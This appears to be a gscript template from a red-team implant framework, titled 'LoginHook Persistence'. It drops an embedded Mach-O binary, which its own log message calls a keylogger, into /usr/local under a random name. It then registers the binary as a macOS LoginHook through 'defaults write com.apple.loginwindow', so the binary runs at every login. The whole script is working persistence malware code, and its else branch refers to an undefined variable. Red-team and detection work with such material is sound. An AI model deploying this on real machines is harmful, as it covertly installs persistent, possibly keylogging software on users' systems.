// Example gscript template
// Title: LoginHook Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a default Login Hook
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/techniques/T1164/

//priority:90
//timeout:150

//go_import:os as os

//import:/private/tmp/example.macho
  
function Deploy() {

    console.log("Starting Login Hook Persistence");

    // Prep the asset
    var exampBin = GetAssetAsBytes("example.macho");
    if (exampBin[1] != null) {
        console.log("errors: "+exampBin[1].Error());
    }

    // Getting a random name
    //var temppath = os.TempDir();
    var temppath = "/usr/local";
    var naming = G.rand.GetAlphaString(4);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    G.file.WriteFileFromBytes(name, exampBin[0]);
    console.log("dropped the keylogger binary here: "+name); 
  
    // Persist the sample
    exec = G.exec.ExecuteCommand("defaults", ["write", "com.apple.loginwindow", "LoginHook", name]);
    if (exec[4] == null) {
        console.log("Persisted binary using com.apple.loginwindow LoginHook");
        console.log("Pid: "+exec[0]);
        console.log("stdout: "+exec[1]);
        console.log("stderr: "+exec[2]);
        console.log("exit code: "+exec[3]);
    } else {
        console.log("go errors: "+execResp[4].Error());
    }   

    console.log("Done Login Hook Persistence");
    return true;
}
